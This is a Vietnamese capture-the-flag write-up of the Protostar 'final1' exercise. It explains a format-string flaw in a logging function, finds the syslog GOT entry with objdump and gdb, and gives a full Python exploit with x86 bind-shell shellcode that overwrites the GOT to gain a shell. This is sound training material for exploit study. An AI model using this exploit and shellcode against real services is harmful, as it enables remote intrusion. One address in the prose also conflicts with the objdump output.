#1-Final1
- Trước tiên cần xem flow chương trình như thế nào
- Hàm main gọi 2 hàm getiport() và parser()
```
void getipport()
{
  int l;
  struct sockaddr_in sin;

  l = sizeof(struct sockaddr_in);
  if(getpeername(0, &sin, &l) == -1) {
      err(1, "you don't exist");
  }

  sprintf(hostname, "%s:%d", inet_ntoa(sin.sin_addr), ntohs(sin.sin_port));
}
```
- getipport() trả về địa chỉ của máy đã kết nối socket, địa chỉ ip nguồn của máy đã kết nối vào socket.
```

void parser()
{
  char line[128];

  printf("[final1] $ ");

  while(fgets(line, sizeof(line)-1, stdin)) {
      trim(line);
      if(strncmp(line, "username ", 9) == 0) {
          strcpy(username, line+9);
      } else if(strncmp(line, "login ", 6) == 0) {
          if(username[0] == 0) {
              printf("invalid protocol\n");
          } else {
              logit(line + 6);
              printf("login failed\n");
          }
      }
      printf("[final1] $ ");
  }
}
```
- parser() chương trình đọc 128 byte vào line sau đó kiểm tra trim(line) xem các kí tự xuống dòng cấp dữ liệu của dòng mới và thay thế nó bằng 0 tạo cắt chuỗi. Sau đó kiểm tra xem bạn dùng chức năng username hay login và ghi dữ liệu đăng nhập qua logit()
```
void logit(char *pw)
{
  char buf[512];

  snprintf(buf, sizeof(buf), "Login from %s as [%s] with password [%s]\n", hostname, username, pw);

  syslog(LOG_USER|LOG_DEBUG, buf);
}
```
- Dữ liệu được ghi lại ở syslog() và đây cũng là hàm có lỗ hổng format string được cho là tương tự printf
- Thử nghiệm 
![Screenshot 2022-03-29 103447](https://i.imgur.com/BW20BwQ.png)
![Screenshot 2022-03-29 103516](https://i.imgur.com/3N9Jtme.png)
- Tìm vị trí có thể viết đè lên để xử lý 
![Screenshot 2022-03-29 115511](https://i.imgur.com/uYIWz85.png)
![Screenshot 2022-03-29 115624](https://i.imgur.com/juZXFtm.png)
- Ý tưởng từ vị trí có thể kiểm soát, đè địa chỉ của hàm syslog() từ đó sẽ gọi biến global để thực thi shellcode.
- Căn chỉnh lại vị trí kiểm soát và nó ở vị trí số 15
![Screenshot 2022-03-29 120802](https://i.imgur.com/isHVEPV.png)
![Screenshot 2022-03-29 120909](https://i.imgur.com/lKeQYDm.png)
- Địa chỉ và biến global của hàm syslog() : 0x0804a1c1 và 0x0804a1a8 
```
root@protostar:/var/log# objdump -R /opt/protostar/bin/final1  | grep "syslog"
0804a11c R_386_JUMP_SLOT   syslog
```
- Tìm địa chỉ của strncmp() ta thấy nó là một Global Table nên nó chưa địa chỉ thực.
![Screenshot 2022-03-29 104213](https://i.imgur.com/eIE7aCd.png)

- Có shellcode
```
shellcode = "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80" \
            "\x5b\x5e\x52\x68\xff\x02\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a" \
            "\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0" \
            "\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f" \
            "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0" \
            "\x0b\xcd\x80"
```
- Chạy thử payload
```
payload = "username X" + "\x1c\xa1\x04\x08" + "\xa8\xa1\x04\x08" + "aa" + shellcode + "%n%n%n%n%n%n" + "\n"
```
- Kiểm tra ebp
```
(gdb) x/40x $ebp
0xbffffbb8: 0xbffffc58 0x080499ef 0xbffffbd6 0x08049f24
0xbffffbc8: 0x00000002 0xb7fffab0 0x69676f6c 0x0061206e
0xbffffbd8: 0xa11c5800 0xa1a80804 0x61610804 0x78787878
0xbffffbe8: 0x78787878 0x78787878 0x78787878 0x78787878
0xbffffbf8: 0x78787878 0x78787878 0x78787878 0x78787878
0xbffffc08: 0x78787878 0x78787878 0x78787878 0x78787878
0xbffffc18: 0x78787878 0x78787878 0x78787878 0x78787878
0xbffffc28: 0x78787878 0x78787878 0x36257878 0x36363334
0xbffffc38: 0x35312578 0x31256e24 0x006e2436 0x00000000
0xbffffc48: 0x00000000 0x00000010 0xb7ff1040 0xb7fd7ff4
```
- Ta thấy địa chỉ của shellcode nằm ở 0xbffffbe4
- Viết payload
```
![Screenshot 2022-03-29 122807](https://i.imgur.com/1HAtx5m.png)import socket

HOST = "127.0.0.1"
PORT = 2994

shellcode = "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80" \
            "\x5b\x5e\x52\x68\xff\x02\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a" \
            "\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0" \
            "\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f" \
            "\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0" \
            "\x0b\xcd\x80"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

msg = s.recv(1024)
print msg

payload = "username X" + "\x1c\xa1\x04\x08" + "\xa8\xa1\x04\x08" + "aa" + shellcode + "%64364x%15$n" + "%50203x%16$n" + "\n"

print payload

#"%64364x%15$n" + "%50203x%16$n" : ghi đè địa chỉ shellcode 0xbffffbe4
#"aa" format cho chuẩn vào địa chỉ bị điều khiển

s.sendall(payload)
msg = s.recv(1024)
print msg
payload = "login a\n"
s.sendall(payload)
msg = s.recv(1024)
print msg
```
![Screenshot 2022-03-29 122807](https://i.imgur.com/7nStJhv.png)
![Screenshot 2022-03-29 113538](https://i.imgur.com/zYkceoi.png)
